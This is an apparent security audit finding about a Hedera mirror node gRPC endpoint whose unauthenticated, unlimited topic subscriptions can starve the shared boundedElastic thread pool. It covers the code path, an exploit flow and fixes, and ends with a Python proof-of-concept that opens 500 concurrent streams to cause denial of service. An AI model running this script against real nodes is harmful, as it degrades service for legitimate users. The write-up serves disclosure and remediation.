### Title
Unbounded Concurrent Subscriptions Exhaust Shared `boundedElastic` Thread Pool via Safety Check Retriever

### Summary
`TopicMessageServiceImpl.subscribeTopic()` imposes no limit on concurrent subscriptions and no authentication. Each subscription schedules a safety-check `Flux` after one second that invokes `PollingTopicMessageRetriever.retrieve()`, which uses the global `Schedulers.boundedElastic()` pool for all repeat-poll scheduling. An unprivileged attacker opening many concurrent subscriptions simultaneously floods this shared pool, starving legitimate subscribers of scheduler threads and degrading or halting message delivery.

### Finding Description

**Code path:**

`TopicMessageServiceImpl.java` lines 67–70:
```java
Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
        .filter(_ -> !topicContext.isComplete())
        .flatMapMany(_ -> missingMessages(topicContext, null))
        .subscribeOn(Schedulers.boundedElastic());
```

After one second, `missingMessages(topicContext, null)` is called (line 69), which reaches `PollingTopicMessageRetriever.retrieve(gapFilter, false)` (line 149 of the impl). Inside the retriever (`PollingTopicMessageRetriever.java` lines 41, 55):
```java
scheduler = Schedulers.boundedElastic();          // constructor, line 41
...
.withScheduler(scheduler)                          // repeatWhen, line 55
```

`Schedulers.boundedElastic()` is the **global singleton** bounded elastic scheduler (default cap: `10 × CPU cores` threads, queue: 100 000 tasks). The same global pool is also used by `SharedTopicListener.listen()` via `publishOn(Schedulers.boundedElastic())` for every active subscriber.

**No rate limiting exists.** `ConsensusController.subscribeTopic()` (lines 43–53) performs no authentication and no connection-count check. `TopicMessageServiceImpl.subscribeTopic()` only calls `topicExists()` (line 87), which validates topic type but enforces nothing else. `subscriberCount` (line 48) is a Micrometer gauge — it is never compared against a maximum.

**Exploit flow:**

1. Attacker opens N concurrent gRPC streams to `subscribeTopic` for any valid topic (e.g., topic 0.0.1).
2. Each subscription creates its own `safetyCheck` Flux with a 1-second `Mono.delay`.
3. After ~1 second, all N safety checks fire simultaneously, each submitting tasks to the global `boundedElastic` pool via the retriever's `withScheduler(scheduler)`.
4. The unthrottled retriever runs up to `maxPolls = 12` iterations at `pollingFrequency = 20 ms` intervals (per `RetrieverProperties.UnthrottledProperties`), meaning N × 12 tasks are queued in rapid succession.
5. Simultaneously, each subscriber's `publishOn(Schedulers.boundedElastic())` in `SharedTopicListener` also competes for the same pool.
6. The pool saturates; legitimate subscribers' drain tasks queue behind attacker tasks, causing message delivery delays or timeouts (retriever `timeout = 60 s`).

**Why existing checks fail:**
- `subscriberCount` is read-only telemetry — no enforcement path exists.
- `topicExists()` only rejects non-topic entity IDs; it does not throttle callers.
- There is no gRPC interceptor, IP-based rate limiter, or per-client connection cap visible in the codebase.

### Impact Explanation
The global `boundedElastic` scheduler is shared across all reactive pipelines in the process. Saturating it delays or blocks: (a) safety-check retrievals for all subscribers, (b) live-message dispatch via `publishOn` in `SharedTopicListener`, and (c) historical retrieval for new subscribers. Legitimate clients experience missed or severely delayed topic messages. Because the attacker's subscriptions remain open indefinitely (no `endTime` required), the degradation is sustained until the attacker disconnects. Severity: **High** (availability impact on a public-facing consensus data service).

### Likelihood Explanation
The gRPC `subscribeTopic` endpoint is publicly accessible with no authentication. Opening thousands of concurrent gRPC streams is trivial with standard gRPC client libraries (e.g., `grpc-java`, `grpcurl` in a loop, or a simple Go/Python script). The 1-second synchronization of all safety checks amplifies the burst. The attack is repeatable and requires no special privileges or knowledge beyond a valid topic ID (which is public on-chain data).

### Recommendation
1. **Enforce a per-IP or global subscriber cap** using a gRPC `ServerInterceptor` that rejects new streams when `subscriberCount` exceeds a configurable threshold.
2. **Isolate the safety-check scheduler** from the shared pool: create a dedicated `Schedulers.newBoundedElastic(...)` instance for safety-check and retriever work so it cannot starve the listener's `publishOn` pool.
3. **Apply rate limiting at the gRPC layer** (e.g., token-bucket per client IP) before the request reaches `ConsensusController`.
4. **Set a maximum on unthrottled `maxPolls`** and consider making the safety check a one-shot with a short timeout rather than a full retriever invocation.

### Proof of Concept
```python
import grpc
import threading
from hedera import consensus_service_pb2_grpc, consensus_service_pb2
from hederahashgraph.api.proto.java import basic_types_pb2

GRPC_HOST = "mirror-node-grpc:5600"
TOPIC_NUM  = 1          # any valid topic
N_STREAMS  = 500        # tune to exceed 10 * CPU_cores

def open_subscription(_):
    channel = grpc.insecure_channel(GRPC_HOST)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=TOPIC_NUM)
    )
    # Block reading; keeps the stream open
    for _ in stub.subscribeTopic(query):
        pass

threads = [threading.Thread(target=open_subscription, args=(i,)) for i in range(N_STREAMS)]
for t in threads:
    t.start()
# After ~1 second all N safety checks fire simultaneously,
# flooding Schedulers.boundedElastic() and degrading legitimate subscribers.
for t in threads:
    t.join()
```

After ~1 second, monitor the mirror node's `boundedElastic` thread pool metrics; task queue depth spikes to N × 12 and legitimate subscriber latency increases proportionally.